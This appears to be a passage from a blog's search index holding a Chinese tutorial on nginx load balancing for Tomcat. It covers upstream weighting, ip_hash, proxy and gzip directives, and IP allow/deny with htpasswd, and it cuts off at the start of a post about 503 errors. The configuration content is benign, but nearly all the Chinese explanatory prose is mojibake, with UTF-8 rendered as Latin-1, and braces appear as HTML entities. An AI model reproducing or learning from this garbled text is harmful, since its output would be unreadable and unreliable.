ç‡ï¼Œweightå’Œè®¿é—®æ¯”ç‡æˆæ­£æ¯”ï¼Œç”¨äºåç«¯æœåŠ¡å™¨æ€§èƒ½ä¸å‡çš„æƒ…å†µã€‚å¦‚ä¸‹æ‰€ç¤ºï¼Œ10.0.0.88çš„è®¿é—®æ¯”ç‡è¦æ¯”10.0.0.77çš„è®¿é—®æ¯”ç‡é«˜ä¸€å€ã€‚```bashupstream linuxidc&#123; server 10.11.155.26 weight=5; server 10.11.155.41 weight=10; &#125; 2ã€ip_hashï¼ˆè®¿é—®ipï¼‰æ¯ä¸ªè¯·æ±‚æŒ‰è®¿é—®ipçš„hashç»“æœåˆ†é…ï¼Œè¿™æ ·æ¯ä¸ªè®¿å®¢å›ºå®šè®¿é—®ä¸€ä¸ªåç«¯æœåŠ¡å™¨ï¼Œå¯ä»¥è§£å†³sessionçš„é—®é¢˜ã€‚ 12345upstream favresin&#123; ip_hash; server 10.11.155.26:8080; server 10.11.155.41:8080; &#125; 3ã€fairï¼ˆç¬¬ä¸‰æ–¹ï¼‰æŒ‰åç«¯æœåŠ¡å™¨çš„å“åº”æ—¶é—´æ¥åˆ†é…è¯·æ±‚ï¼Œå“åº”æ—¶é—´çŸ­çš„ä¼˜å…ˆåˆ†é…ã€‚ä¸weightåˆ†é…ç­–ç•¥ç±»ä¼¼ã€‚ 12345upstream favresin&#123; server 10.11.155.26:8080; server 10.11.155.41:8080; fair; &#125; serveræŒ‡ä»¤å‚æ•°å¦‚ä¸‹ï¼š 12345- weight â€”â€”æƒé‡ï¼Œæ•°å€¼è¶Šå¤§ï¼Œåˆ†å¾—çš„è¯·æ±‚æ•°å°±è¶Šå¤šï¼Œé»˜è®¤å€¼ä¸º1ã€‚- max_fails â€”â€”å¯¹è®¿é—®å¤±è´¥çš„åç«¯æœåŠ¡å™¨å°è¯•è®¿é—®çš„æ¬¡æ•°ã€‚é»˜è®¤å€¼ä¸º1ï¼Œå½“è®¾ç½®ä¸º0æ—¶å°†å…³é—­æ£€æŸ¥ã€‚- fail_timeoutâ€”â€”å¤±æ•ˆè¶…æ—¶æ—¶é—´ï¼Œå½“å¤šæ¬¡è®¿é—®å¤±è´¥åï¼Œå¯¹è¯¥èŠ‚ç‚¹æš‚åœè®¿é—®ã€‚- downâ€”â€”æ ‡è®°æœåŠ¡å™¨ä¸ºæ°¸ä¹…ç¦»çº¿çŠ¶æ€ï¼Œç”¨äºip_hashæŒ‡ä»¤ã€‚- backupâ€”â€”ä»…å½“ébackupæœåŠ¡å™¨å…¨éƒ¨å®•æœºæˆ–ç¹å¿™æ—¶å¯ç”¨ã€‚ ä¾‹å¦‚ï¼Œå¯ä»¥è¿™æ ·é…ç½®ï¼š å¼•ç”¨ upstream tomcat { server 10.11.155.26:8080 weight=5; server 10.11.155.41:8080 weight=10; } åè€…åˆ†å¾—çš„è¯·æ±‚æ•°å°±ä¼šè¾ƒé«˜ã€‚ è¯¦ç»†ç‚¹çš„è´Ÿè½½å‡è¡¡é…ç½®nginx.conf:123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133user www;worker_processes 1;#error_log logs/error.log;#error_log logs/error.log notice;#error_log logs/error.log info;error_log /opt/logs/nginx/error.log crit;# pid /usr/local/nginx/nginx.pid;pid /var/run/nginx.pid;worker_rlimit_nofile 1024;events &#123; use epoll; worker_connections 65535;&#125;#è®¾å®šhttpæœåŠ¡å™¨ï¼Œåˆ©ç”¨å®ƒçš„åå‘ä»£ç†åŠŸèƒ½æä¾›è´Ÿè½½å‡è¡¡æ”¯æŒhttp &#123; #è®¾å®šmimeç±»å‹,ç±»å‹ç”±mime.typeæ–‡ä»¶å®šä¹‰ include /etc/nginx/mime.types; default_type application/octet-stream; #access_log logs/access.log main; server_names_hash_bucket_size 128; client_header_buffer_size 32k; large_client_header_buffers 4 32k; sendfile on; tcp_nopush on; tcp_nodelay on; #keepalive_timeout 0; keepalive_timeout 65; #gzip on; log_format access '$remote_addr - $remote_user [$time_local] \"$request\" ' '$status $body_bytes_sent \"$http_referer\" ' '\"$http_user_agent\" \"$http_x_forwarded_for\"'; #è®¾å®šæ—¥å¿—æ ¼å¼ access_log /var/log/nginx/access.log; server &#123; listen 80; server_name localhost; location / &#123; root html; index index.html index.htm; limit_req zone=one; &#125; error_page 500 502 503 504 /50x.html; location = /50x.html &#123; root html; &#125; &#125; #çœç•¥ä¸Šæ–‡æœ‰çš„ä¸€äº›é…ç½®èŠ‚ç‚¹ #ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ #è®¾å®šè´Ÿè½½å‡è¡¡çš„æœåŠ¡å™¨åˆ—è¡¨ upstream tomcat-account &#123; #weigthå‚æ•°è¡¨ç¤ºæƒå€¼ï¼Œæƒå€¼è¶Šé«˜è¢«åˆ†é…åˆ°çš„å‡ ç‡è¶Šå¤§ server 192.168.8.1x:3128 weight=5; #æœ¬æœºä¸Šçš„Squidå¼€å¯3128ç«¯å£,ä¸æ˜¯å¿…é¡»è¦squid server 192.168.8.2x:80 weight=1; server 192.168.8.3x:80 weight=6; &#125; upstream mysvr2 &#123; #weigthå‚æ•°è¡¨ç¤ºæƒå€¼ï¼Œæƒå€¼è¶Šé«˜è¢«åˆ†é…åˆ°çš„å‡ ç‡è¶Šå¤§ server 192.168.8.x:80 weight=1; server 192.168.8.x:80 weight=6; &#125; #ç¬¬ä¸€ä¸ªè™šæ‹ŸæœåŠ¡å™¨ server &#123; #ä¾¦å¬192.168.8.xçš„80ç«¯å£ listen 80; server_name 192.168.8.x; #å¯¹aspxåç¼€çš„è¿›è¡Œè´Ÿè½½å‡è¡¡è¯·æ±‚ location ~ .*.aspx$ &#123; #å®šä¹‰æœåŠ¡å™¨çš„é»˜è®¤ç½‘ç«™æ ¹ç›®å½•ä½ç½® root /root; #å®šä¹‰é¦–é¡µç´¢å¼•æ–‡ä»¶çš„åç§° index index.php index.html index.htm; #è¯·æ±‚è½¬å‘mysvr å®šä¹‰çš„æœåŠ¡å™¨åˆ—è¡¨ proxy_pass http://tomcat-account; #ä»¥ä¸‹æ˜¯ä¸€äº›åå‘ä»£ç†çš„é…ç½®å¯åˆ é™¤.æ‰€ä»¥å¯ä»¥æŒ‰nginx+tomcat åšè´Ÿè½½å‡è¡¡å³å¯ã€‚ proxy_redirect off; #åç«¯çš„WebæœåŠ¡å™¨å¯ä»¥é€šè¿‡X-Forwarded-Forè·å–ç”¨æˆ·çœŸå®IP proxy_set_header Host $host; proxy_set_header X-Real-IP $remote_addr; proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for; #å…è®¸å®¢æˆ·ç«¯è¯·æ±‚çš„æœ€å¤§å•æ–‡ä»¶å­—èŠ‚æ•° client_max_body_size 10m; #ç¼“å†²åŒºä»£ç†ç¼“å†²ç”¨æˆ·ç«¯è¯·æ±‚çš„æœ€å¤§å­—èŠ‚æ•°ï¼Œ client_body_buffer_size 128k; #nginxè·Ÿåç«¯æœåŠ¡å™¨è¿æ¥è¶…æ—¶æ—¶é—´(ä»£ç†è¿æ¥è¶…æ—¶) proxy_connect_timeout 90; #è¿æ¥æˆåŠŸåï¼Œåç«¯æœåŠ¡å™¨å“åº”æ—¶é—´(ä»£ç†æ¥æ”¶è¶…æ—¶) proxy_read_timeout 90; #è®¾ç½®ä»£ç†æœåŠ¡å™¨ï¼ˆnginxï¼‰ä¿å­˜ç”¨æˆ·å¤´ä¿¡æ¯çš„ç¼“å†²åŒºå¤§å° proxy_buffer_size 4k; #proxy_buffersç¼“å†²åŒºï¼Œç½‘é¡µå¹³å‡åœ¨32kä»¥ä¸‹çš„è¯ï¼Œè¿™æ ·è®¾ç½® proxy_buffers 4 32k; #é«˜è´Ÿè·ä¸‹ç¼“å†²å¤§å°ï¼ˆproxy_buffers*2ï¼‰ proxy_busy_buffers_size 64k; #è®¾å®šç¼“å­˜æ–‡ä»¶å¤¹å¤§å°ï¼Œå¤§äºè¿™ä¸ªå€¼ï¼Œå°†ä»upstreamæœåŠ¡å™¨ä¼  proxy_temp_file_write_size 64k; &#125; &#125;&#125; å¸¸ç”¨æŒ‡ä»¤è¯´æ˜123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899nginxåœ¨è¿è¡Œæ—¶ä¸å…·ä½“ä¸šåŠ¡åŠŸèƒ½ï¼ˆæ¯”å¦‚httpæœåŠ¡æˆ–è€…emailæœåŠ¡ä»£ç†ï¼‰æ— å…³çš„ä¸€äº›å‚æ•°ï¼Œæ¯”å¦‚å·¥ä½œè¿›ç¨‹æ•°ï¼Œè¿è¡Œçš„èº«ä»½ç­‰ã€‚woker_processes 2åœ¨é…ç½®æ–‡ä»¶çš„é¡¶çº§mainéƒ¨åˆ†ï¼Œworkerè§’è‰²çš„å·¥ä½œè¿›ç¨‹çš„ä¸ªæ•°ï¼Œmasterè¿›ç¨‹æ˜¯æ¥æ”¶å¹¶åˆ†é…è¯·æ±‚ç»™workerå¤„ç†ã€‚è¿™ä¸ªæ•°å€¼ç®€å•ä¸€ç‚¹å¯ä»¥è®¾ç½®ä¸ºcpuçš„æ ¸æ•°grep ^processor /proc/cpuinfo | wc -lï¼Œä¹Ÿæ˜¯ auto å€¼ï¼Œå¦‚æœå¼€å¯äº†sslå’Œgzipæ›´åº”è¯¥è®¾ç½®æˆä¸é€»è¾‘CPUæ•°é‡ä¸€æ ·ç”šè‡³ä¸º2å€ï¼Œå¯ä»¥å‡å°‘I/Oæ“ä½œã€‚å¦‚æœnginxæœåŠ¡å™¨è¿˜æœ‰å…¶å®ƒæœåŠ¡ï¼Œå¯ä»¥è€ƒè™‘é€‚å½“å‡å°‘ã€‚worker_cpu_affinityä¹Ÿæ˜¯å†™åœ¨mainéƒ¨åˆ†ã€‚åœ¨é«˜å¹¶å‘æƒ…å†µä¸‹ï¼Œé€šè¿‡è®¾ç½®cpuç²˜æ€§æ¥é™ä½ç”±äºå¤šCPUæ ¸åˆ‡æ¢é€ æˆçš„å¯„å­˜å™¨ç­‰ç°åœºé‡å»ºå¸¦æ¥çš„æ€§èƒ½æŸè€—ã€‚å¦‚worker_cpu_affinity 0001 0010 0100 1000; ï¼ˆå››æ ¸ï¼‰ã€‚worker_connections 2048å†™åœ¨eventséƒ¨åˆ†ã€‚æ¯ä¸€ä¸ªworkerè¿›ç¨‹èƒ½å¹¶å‘å¤„ç†ï¼ˆå‘èµ·ï¼‰çš„æœ€å¤§è¿æ¥æ•°ï¼ˆåŒ…å«ä¸å®¢æˆ·ç«¯æˆ–åç«¯è¢«ä»£ç†æœåŠ¡å™¨é—´ç­‰æ‰€æœ‰è¿æ¥æ•°ï¼‰ã€‚nginxä½œä¸ºåå‘ä»£ç†æœåŠ¡å™¨ï¼Œè®¡ç®—å…¬å¼ æœ€å¤§è¿æ¥æ•° = worker_processes * worker_connections/4ï¼Œæ‰€ä»¥è¿™é‡Œå®¢æˆ·ç«¯æœ€å¤§è¿æ¥æ•°æ˜¯1024ï¼Œè¿™ä¸ªå¯ä»¥å¢åˆ°åˆ°8192éƒ½æ²¡å…³ç³»ï¼Œçœ‹æƒ…å†µè€Œå®šï¼Œä½†ä¸èƒ½è¶…è¿‡åé¢çš„worker_rlimit_nofileã€‚å½“nginxä½œä¸ºhttpæœåŠ¡å™¨æ—¶ï¼Œè®¡ç®—å…¬å¼é‡Œé¢æ˜¯é™¤ä»¥2ã€‚worker_rlimit_nofile 10240å†™åœ¨mainéƒ¨åˆ†ã€‚é»˜è®¤æ˜¯æ²¡æœ‰è®¾ç½®ï¼Œå¯ä»¥é™åˆ¶ä¸ºæ“ä½œç³»ç»Ÿæœ€å¤§çš„é™åˆ¶65535ã€‚use epollå†™åœ¨eventséƒ¨åˆ†ã€‚åœ¨Linuxæ“ä½œç³»ç»Ÿä¸‹ï¼Œnginxé»˜è®¤ä½¿ç”¨epolläº‹ä»¶æ¨¡å‹ï¼Œå¾—ç›Šäºæ­¤ï¼Œnginxåœ¨Linuxæ“ä½œç³»ç»Ÿä¸‹æ•ˆç‡ç›¸å½“é«˜ã€‚åŒæ—¶Nginxåœ¨OpenBSDæˆ–FreeBSDæ“ä½œç³»ç»Ÿä¸Šé‡‡ç”¨ç±»ä¼¼äºepollçš„é«˜æ•ˆäº‹ä»¶æ¨¡å‹kqueueã€‚åœ¨æ“ä½œç³»ç»Ÿä¸æ”¯æŒè¿™äº›é«˜æ•ˆæ¨¡å‹æ—¶æ‰ä½¿ç”¨selectã€‚2.2.2 httpæœåŠ¡å™¨ä¸æä¾›httpæœåŠ¡ç›¸å…³çš„ä¸€äº›é…ç½®å‚æ•°ã€‚ä¾‹å¦‚ï¼šæ˜¯å¦ä½¿ç”¨keepaliveå•Šï¼Œæ˜¯å¦ä½¿ç”¨gzipè¿›è¡Œå‹ç¼©ç­‰ã€‚sendfile onå¼€å¯é«˜æ•ˆæ–‡ä»¶ä¼ è¾“æ¨¡å¼ï¼ŒsendfileæŒ‡ä»¤æŒ‡å®šnginxæ˜¯å¦è°ƒç”¨sendfileå‡½æ•°æ¥è¾“å‡ºæ–‡ä»¶ï¼Œå‡å°‘ç”¨æˆ·ç©ºé—´åˆ°å†…æ ¸ç©ºé—´çš„ä¸Šä¸‹æ–‡åˆ‡æ¢ã€‚å¯¹äºæ™®é€šåº”ç”¨è®¾ä¸º onï¼Œå¦‚æœç”¨æ¥è¿›è¡Œä¸‹è½½ç­‰åº”ç”¨ç£ç›˜IOé‡è´Ÿè½½åº”ç”¨ï¼Œå¯è®¾ç½®ä¸ºoffï¼Œä»¥å¹³è¡¡ç£ç›˜ä¸ç½‘ç»œI/Oå¤„ç†é€Ÿåº¦ï¼Œé™ä½ç³»ç»Ÿçš„è´Ÿè½½ã€‚keepalive_timeout 65 : é•¿è¿æ¥è¶…æ—¶æ—¶é—´ï¼Œå•ä½æ˜¯ç§’ï¼Œè¿™ä¸ªå‚æ•°å¾ˆæ•æ„Ÿï¼Œæ¶‰åŠæµè§ˆå™¨çš„ç§ç±»ã€åç«¯æœåŠ¡å™¨çš„è¶…æ—¶è®¾ç½®ã€æ“ä½œç³»ç»Ÿçš„è®¾ç½®ï¼Œå¯ä»¥å¦å¤–èµ·ä¸€ç‰‡æ–‡ç« äº†ã€‚é•¿è¿æ¥è¯·æ±‚å¤§é‡å°æ–‡ä»¶çš„æ—¶å€™ï¼Œå¯ä»¥å‡å°‘é‡å»ºè¿æ¥çš„å¼€é”€ï¼Œä½†å‡å¦‚æœ‰å¤§æ–‡ä»¶ä¸Šä¼ ï¼Œ65så†…æ²¡ä¸Šä¼ å®Œæˆä¼šå¯¼è‡´å¤±è´¥ã€‚å¦‚æœè®¾ç½®æ—¶é—´è¿‡é•¿ï¼Œç”¨æˆ·åˆå¤šï¼Œé•¿æ—¶é—´ä¿æŒè¿æ¥ä¼šå ç”¨å¤§é‡èµ„æºã€‚send_timeout : ç”¨äºæŒ‡å®šå“åº”å®¢æˆ·ç«¯çš„è¶…æ—¶æ—¶é—´ã€‚è¿™ä¸ªè¶…æ—¶ä»…é™äºä¸¤ä¸ªè¿æ¥æ´»åŠ¨ä¹‹é—´çš„æ—¶é—´ï¼Œå¦‚æœè¶…è¿‡è¿™ä¸ªæ—¶é—´ï¼Œå®¢æˆ·ç«¯æ²¡æœ‰ä»»ä½•æ´»åŠ¨ï¼ŒNginxå°†ä¼šå…³é—­è¿æ¥ã€‚client_max_body_size 10må…è®¸å®¢æˆ·ç«¯è¯·æ±‚çš„æœ€å¤§å•æ–‡ä»¶å­—èŠ‚æ•°ã€‚å¦‚æœæœ‰ä¸Šä¼ è¾ƒå¤§æ–‡ä»¶ï¼Œè¯·è®¾ç½®å®ƒçš„é™åˆ¶å€¼client_body_buffer_size 128kç¼“å†²åŒºä»£ç†ç¼“å†²ç”¨æˆ·ç«¯è¯·æ±‚çš„æœ€å¤§å­—èŠ‚æ•°æ¨¡å—http_proxyï¼šè¿™ä¸ªæ¨¡å—å®ç°çš„æ˜¯nginxä½œä¸ºåå‘ä»£ç†æœåŠ¡å™¨çš„åŠŸèƒ½ï¼ŒåŒ…æ‹¬ç¼“å­˜åŠŸèƒ½ï¼ˆå¦è§æ–‡ç« ï¼‰proxy_connect_timeout 60nginxè·Ÿåç«¯æœåŠ¡å™¨è¿æ¥è¶…æ—¶æ—¶é—´(ä»£ç†è¿æ¥è¶…æ—¶)proxy_read_timeout 60è¿æ¥æˆåŠŸåï¼Œä¸åç«¯æœåŠ¡å™¨ä¸¤ä¸ªæˆåŠŸçš„å“åº”æ“ä½œä¹‹é—´è¶…æ—¶æ—¶é—´(ä»£ç†æ¥æ”¶è¶…æ—¶)proxy_buffer_size 4kè®¾ç½®ä»£ç†æœåŠ¡å™¨ï¼ˆnginxï¼‰ä»åç«¯realserverè¯»å–å¹¶ä¿å­˜ç”¨æˆ·å¤´ä¿¡æ¯çš„ç¼“å†²åŒºå¤§å°ï¼Œé»˜è®¤ä¸proxy_bufferså¤§å°ç›¸åŒï¼Œå…¶å®å¯ä»¥å°†è¿™ä¸ªæŒ‡ä»¤å€¼è®¾çš„å°ä¸€ç‚¹proxy_buffers 4 32kproxy_buffersç¼“å†²åŒºï¼Œnginxé’ˆå¯¹å•ä¸ªè¿æ¥ç¼“å­˜æ¥è‡ªåç«¯realserverçš„å“åº”ï¼Œç½‘é¡µå¹³å‡åœ¨32kä»¥ä¸‹çš„è¯ï¼Œè¿™æ ·è®¾ç½®proxy_busy_buffers_size 64ké«˜è´Ÿè·ä¸‹ç¼“å†²å¤§å°ï¼ˆproxy_buffers*2ï¼‰proxy_max_temp_file_sizeå½“ proxy_buffers æ”¾ä¸ä¸‹åç«¯æœåŠ¡å™¨çš„å“åº”å†…å®¹æ—¶ï¼Œä¼šå°†ä¸€éƒ¨åˆ†ä¿å­˜åˆ°ç¡¬ç›˜çš„ä¸´æ—¶æ–‡ä»¶ä¸­ï¼Œè¿™ä¸ªå€¼ç”¨æ¥è®¾ç½®æœ€å¤§ä¸´æ—¶æ–‡ä»¶å¤§å°ï¼Œé»˜è®¤1024Mï¼Œå®ƒä¸ proxy_cache æ²¡æœ‰å…³ç³»ã€‚å¤§äºè¿™ä¸ªå€¼ï¼Œå°†ä»upstreamæœåŠ¡å™¨ä¼ å›ã€‚è®¾ç½®ä¸º0ç¦ç”¨ã€‚proxy_temp_file_write_size 64kå½“ç¼“å­˜è¢«ä»£ç†çš„æœåŠ¡å™¨å“åº”åˆ°ä¸´æ—¶æ–‡ä»¶æ—¶ï¼Œè¿™ä¸ªé€‰é¡¹é™åˆ¶æ¯æ¬¡å†™ä¸´æ—¶æ–‡ä»¶çš„å¤§å°ã€‚proxy_temp_pathï¼ˆå¯ä»¥åœ¨ç¼–è¯‘çš„æ—¶å€™ï¼‰æŒ‡å®šå†™åˆ°å“ªé‚£ä¸ªç›®å½•ã€‚proxy_passï¼Œproxy_redirectè§ location éƒ¨åˆ†ã€‚æ¨¡å—http_gzipï¼šgzip on : å¼€å¯gzipå‹ç¼©è¾“å‡ºï¼Œå‡å°‘ç½‘ç»œä¼ è¾“ã€‚gzip_min_length 1k ï¼š è®¾ç½®å…è®¸å‹ç¼©çš„é¡µé¢æœ€å°å­—èŠ‚æ•°ï¼Œé¡µé¢å­—èŠ‚æ•°ä»headerå¤´å¾—content-lengthä¸­è¿›è¡Œè·å–ã€‚é»˜è®¤å€¼æ˜¯20ã€‚å»ºè®®è®¾ç½®æˆå¤§äº1kçš„å­—èŠ‚æ•°ï¼Œå°äº1kå¯èƒ½ä¼šè¶Šå‹è¶Šå¤§ã€‚gzip_buffers 4 16k ï¼š è®¾ç½®ç³»ç»Ÿè·å–å‡ ä¸ªå•ä½çš„ç¼“å­˜ç”¨äºå­˜å‚¨gzipçš„å‹ç¼©ç»“æœæ•°æ®æµã€‚4 16kä»£è¡¨ä»¥16kä¸ºå•ä½ï¼Œå®‰è£…åŸå§‹æ•°æ®å¤§å°ä»¥16kä¸ºå•ä½çš„4å€ç”³è¯·å†…å­˜ã€‚gzip_http_version 1.0 ï¼š ç”¨äºè¯†åˆ« http åè®®çš„ç‰ˆæœ¬ï¼Œæ—©æœŸçš„æµè§ˆå™¨ä¸æ”¯æŒ Gzip å‹ç¼©ï¼Œç”¨æˆ·å°±ä¼šçœ‹åˆ°ä¹±ç ï¼Œæ‰€ä»¥ä¸ºäº†æ”¯æŒå‰æœŸç‰ˆæœ¬åŠ ä¸Šäº†è¿™ä¸ªé€‰é¡¹ï¼Œå¦‚æœä½ ç”¨äº† Nginx çš„åå‘ä»£ç†å¹¶æœŸæœ›ä¹Ÿå¯ç”¨ Gzip å‹ç¼©çš„è¯ï¼Œç”±äºæœ«ç«¯é€šä¿¡æ˜¯ http/1.0ï¼Œæ•…è¯·è®¾ç½®ä¸º 1.0ã€‚gzip_comp_level 6 ï¼š gzipå‹ç¼©æ¯”ï¼Œ1å‹ç¼©æ¯”æœ€å°å¤„ç†é€Ÿåº¦æœ€å¿«ï¼Œ9å‹ç¼©æ¯”æœ€å¤§ä½†å¤„ç†é€Ÿåº¦æœ€æ…¢(ä¼ è¾“å¿«ä½†æ¯”è¾ƒæ¶ˆè€—cpu)gzip_types ï¼šåŒ¹é…mimeç±»å‹è¿›è¡Œå‹ç¼©ï¼Œæ— è®ºæ˜¯å¦æŒ‡å®š,â€text/htmlâ€ç±»å‹æ€»æ˜¯ä¼šè¢«å‹ç¼©çš„ã€‚gzip_proxied any ï¼š Nginxä½œä¸ºåå‘ä»£ç†çš„æ—¶å€™å¯ç”¨ï¼Œå†³å®šå¼€å¯æˆ–è€…å…³é—­åç«¯æœåŠ¡å™¨è¿”å›çš„ç»“æœæ˜¯å¦å‹ç¼©ï¼ŒåŒ¹é…çš„å‰ææ˜¯åç«¯æœåŠ¡å™¨å¿…é¡»è¦è¿”å›åŒ…å«â€Viaâ€çš„ headerå¤´ã€‚gzip_vary on ï¼š å’Œhttpå¤´æœ‰å…³ç³»ï¼Œä¼šåœ¨å“åº”å¤´åŠ ä¸ª Vary: Accept-Encoding ï¼Œå¯ä»¥è®©å‰ç«¯çš„ç¼“å­˜æœåŠ¡å™¨ç¼“å­˜ç»è¿‡gzipå‹ç¼©çš„é¡µé¢ï¼Œä¾‹å¦‚ï¼Œç”¨Squidç¼“å­˜ç»è¿‡Nginxå‹ç¼©çš„æ•°æ®ã€‚ã€‚2.2.3 serverè™šæ‹Ÿä¸»æœºhttpæœåŠ¡ä¸Šæ”¯æŒè‹¥å¹²è™šæ‹Ÿä¸»æœºã€‚æ¯ä¸ªè™šæ‹Ÿä¸»æœºä¸€ä¸ªå¯¹åº”çš„serveré…ç½®é¡¹ï¼Œé…ç½®é¡¹é‡Œé¢åŒ…å«è¯¥è™šæ‹Ÿä¸»æœºç›¸å…³çš„é…ç½®ã€‚åœ¨æä¾›mailæœåŠ¡çš„ä»£ç†æ—¶ï¼Œä¹Ÿå¯ä»¥å»ºç«‹è‹¥å¹²serverã€‚æ¯ä¸ªserveré€šè¿‡ç›‘å¬åœ°å€æˆ–ç«¯å£æ¥åŒºåˆ†ã€‚listenç›‘å¬ç«¯å£ï¼Œé»˜è®¤80ï¼Œå°äº1024çš„è¦ä»¥rootå¯åŠ¨ã€‚å¯ä»¥ä¸ºlisten *:80ã€listen 127.0.0.1:80ç­‰å½¢å¼ã€‚server_nameæœåŠ¡å™¨åï¼Œå¦‚localhostã€www.example.comï¼Œå¯ä»¥é€šè¿‡æ­£åˆ™åŒ¹é…ã€‚æ¨¡å—http_streamè¿™ä¸ªæ¨¡å—é€šè¿‡ä¸€ä¸ªç®€å•çš„è°ƒåº¦ç®—æ³•æ¥å®ç°å®¢æˆ·ç«¯IPåˆ°åç«¯æœåŠ¡å™¨çš„è´Ÿè½½å‡è¡¡ï¼Œupstreamåæ¥è´Ÿè½½å‡è¡¡å™¨çš„åå­—ï¼Œåç«¯realserverä»¥ host:port options; æ–¹å¼ç»„ç»‡åœ¨ &#123;&#125; ä¸­ã€‚å¦‚æœåç«¯è¢«ä»£ç†çš„åªæœ‰ä¸€å°ï¼Œä¹Ÿå¯ä»¥ç›´æ¥å†™åœ¨ proxy_pass ã€‚2.2.4 locationhttpæœåŠ¡ä¸­ï¼ŒæŸäº›ç‰¹å®šçš„URLå¯¹åº”çš„ä¸€ç³»åˆ—é…ç½®é¡¹ã€‚root /var/www/htmlå®šä¹‰æœåŠ¡å™¨çš„é»˜è®¤ç½‘ç«™æ ¹ç›®å½•ä½ç½®ã€‚å¦‚æœlocationURLåŒ¹é…çš„æ˜¯å­ç›®å½•æˆ–æ–‡ä»¶ï¼Œrootæ²¡ä»€ä¹ˆä½œç”¨ï¼Œä¸€èˆ¬æ”¾åœ¨serveræŒ‡ä»¤é‡Œé¢æˆ–/ä¸‹ã€‚index index.jsp index.html index.htmå®šä¹‰è·¯å¾„ä¸‹é»˜è®¤è®¿é—®çš„æ–‡ä»¶åï¼Œä¸€èˆ¬è·Ÿç€rootæ”¾proxy_pass http:/backendè¯·æ±‚è½¬å‘backendå®šä¹‰çš„æœåŠ¡å™¨åˆ—è¡¨ï¼Œå³åå‘ä»£ç†ï¼Œå¯¹åº”upstreamè´Ÿè½½å‡è¡¡å™¨ã€‚ä¹Ÿå¯ä»¥proxy_pass http://ip:portã€‚proxy_redirect off;proxy_set_header Host $host;proxy_set_header X-Real-IP $remote_addr;proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;è¿™å››ä¸ªæš‚ä¸”è¿™æ ·è®¾ï¼Œå¦‚æœæ·±ç©¶çš„è¯ï¼Œæ¯ä¸€ä¸ªéƒ½æ¶‰åŠåˆ°å¾ˆå¤æ‚çš„å†…å®¹ï¼Œä¹Ÿå°†é€šè¿‡å¦ä¸€ç¯‡æ–‡ç« æ¥è§£è¯»ã€‚ è¿™é‡Œæˆ‘è´´å‡ºæˆ‘å…¬å¸ç°åœ¨Nginxå•èŠ‚ç‚¹è´Ÿè½½å‡è¡¡ä»£ç†å¯ä»¥ä½¿ç”¨ä¸‹é¢æ ¼å¼ï¼š12345678910111213141516171819202122232425262728293031323334353637383940414243444546http &#123; include mime.types; default_type application/octet-stream; log_format main '$remote_addr - $remote_user [$time_local] \"$request\" ' '$status $body_bytes_sent \"$http_referer\" ' '\"$http_user_agent\" \"$http_x_forwarded_for\"'; access_log /var/log/nginx/access.log; sendfile on; #tcp_nopush on; #keepalive_timeout 0; keepalive_timeout 65; #gzip on; server &#123; listen 80; server_name localhost; location / &#123; root html; index index.html index.htm; &#125; error_page 500 502 503 504 /50x.html; location = /50x.html &#123; root html; &#125;&#125; upstream sentry &#123; server 120.26.164.217:9000 weight=1; &#125; server &#123; listen 80; server_name sentdy.ihaozhuo.com; location / &#123; index index.html index.php index.jsp index.htm; proxy_pass http://sentry; proxy_ignore_client_abort on; proxy_redirect off; proxy_set_header Host $host; proxy_set_header X-Real-IP $remote_addr; proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for; &#125; &#125;&#125; è®¿é—®æ§åˆ¶ allow/denyNginx çš„è®¿é—®æ§åˆ¶æ¨¡å—é»˜è®¤å°±ä¼šå®‰è£…ï¼Œè€Œä¸”å†™æ³•ä¹Ÿéå¸¸ç®€å•ï¼Œå¯ä»¥åˆ†åˆ«æœ‰å¤šä¸ªallow,denyï¼Œå…è®¸æˆ–ç¦æ­¢æŸä¸ªipæˆ–ipæ®µè®¿é—®ï¼Œä¾æ¬¡æ»¡è¶³ä»»ä½•ä¸€ä¸ªè§„åˆ™å°±åœæ­¢å¾€ä¸‹åŒ¹é…ã€‚å¦‚ï¼š 12345678910location /nginx-status &#123; stub_status on; access_log off;# auth_basic \"NginxStatus\";# auth_basic_user_file /usr/local/nginx-1.6/htpasswd; allow 192.168.1.100; allow 172.29.73.0/24; deny all;&#125; æˆ‘ä»¬ä¹Ÿå¸¸ç”¨ httpd-devel å·¥å…·çš„ htpasswd æ¥ä¸ºè®¿é—®çš„è·¯å¾„è®¾ç½®ç™»å½•å¯†ç ï¼š 123456789# htpasswd -c htpasswd adminNew passwd:Re-type new password:Adding password for user admin# htpasswd htpasswd admin //ä¿®æ”¹adminå¯†ç # htpasswd htpasswd sean //å¤šæ·»åŠ ä¸€ä¸ªè®¤è¯ç”¨æˆ·è¿™æ ·å°±ç”Ÿæˆäº†é»˜è®¤ä½¿ç”¨CRYPTåŠ å¯†çš„å¯†ç æ–‡ä»¶ã€‚æ‰“å¼€ä¸Šé¢nginx-statusçš„ä¸¤è¡Œæ³¨é‡Šï¼Œé‡å¯nginxç”Ÿæ•ˆã€‚ å‚è€ƒ http://liuqunying.blog.51cto.com/3984207/1420556 http://nginx.org/en/docs/ngx_core_module.html#worker_cpu_affinity http://wiki.nginx.org/HttpCoreModule#sendfile","link":"/2016/05/23/WebæœåŠ¡æŠ€æœ¯/Nginx/Nginx+Tomcatå®ç°è´Ÿè½½å‡è¡¡è®¾ç½®è®¿é—®æ§åˆ¶/"},{"title":"NGINXè§£å†³åŠæ³•-503-Service.Temporarily.Unavailable","text":"503 Service Temporarily Unavailable è§£å†³åŠæ³•-nginxå› ä¸ºæœ€è¿‘å…¬å¸å¾®ä¿¡æŠ½å¥–æ´»åŠ¨é¡¹ç›®ç¯å¢ƒ - ginxåšè´Ÿè½½å‡è¡¡é™åˆ¶æŸä¸ªIPåŒä¸€æ—¶é—´æ®µçš„è®¿é—®æ¬¡æ•°ã€‚ å°±æ˜¯é˜²æ­¢æœ‰äººåŒä¸€ä¸ªIPä¸æ–­è¯·æ±‚ï¼Œç½‘ç«™åˆ·æ–°åç»å¸¸å‡ºç°503 